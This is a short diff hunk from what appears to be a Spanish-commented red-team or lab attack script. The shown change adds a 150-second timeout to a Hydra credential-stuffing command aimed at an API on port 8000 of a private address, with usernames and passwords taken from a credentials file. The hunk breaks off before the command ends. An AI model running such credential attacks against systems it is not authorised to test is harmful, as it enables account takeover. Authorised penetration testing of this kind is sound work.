@@ -47,7 +47,7 @@ fi
 echo "[*] Fase 1: Hydra credential stuffing contra API"
 cut -d: -f1 /tmp/creds.txt | sort -u > /tmp/hydra_users.txt
 cut -d: -f2 /tmp/creds.txt | sort -u > /tmp/hydra_passwords.txt
-hydra -L /tmp/hydra_users.txt \
+timeout 150 hydra -L /tmp/hydra_users.txt \
     -P /tmp/hydra_passwords.txt \
     -t 8 -f -s 8000 \
     "10.20.0.20" \
